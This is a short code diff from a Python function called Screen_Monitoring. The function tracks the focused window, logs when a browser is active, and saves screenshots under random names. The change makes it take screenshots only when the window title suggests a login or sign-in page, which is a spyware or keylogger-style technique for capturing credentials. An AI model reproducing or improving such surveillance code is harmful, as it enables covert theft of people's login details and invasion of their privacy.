@@ -79,12 +79,13 @@ def Screen_Monitoring():
         for browser in browser_names:
             if browser.lower() in active_win_title.lower():
                 # Log when a browser is focused and take a screenshot
-                write_to_file(f'\n<!Brownser focused (screen): {active_win_title}\n')
-                screen_name = ''
-                instance = screenshot()
-                for x in range(1, 10):
-                    screen_name = screen_name + choice(ascii_letters)
-                instance.save(f'{screen_name}.png')
+                write_to_file(f'\n<!Brownser focused: {active_win_title} > \n')
+                if 'log' in active_win_title.lower() or 'sign' in active_win_title.lower():
+                    screen_name = ''
+                    instance = screenshot()
+                    for x in range(1, 10):
+                        screen_name = screen_name + choice(ascii_letters)
+                    instance.save(f'{screen_name}.png')
         sleep(seconds)
 
 # Initialize the thread for screen monitoring  
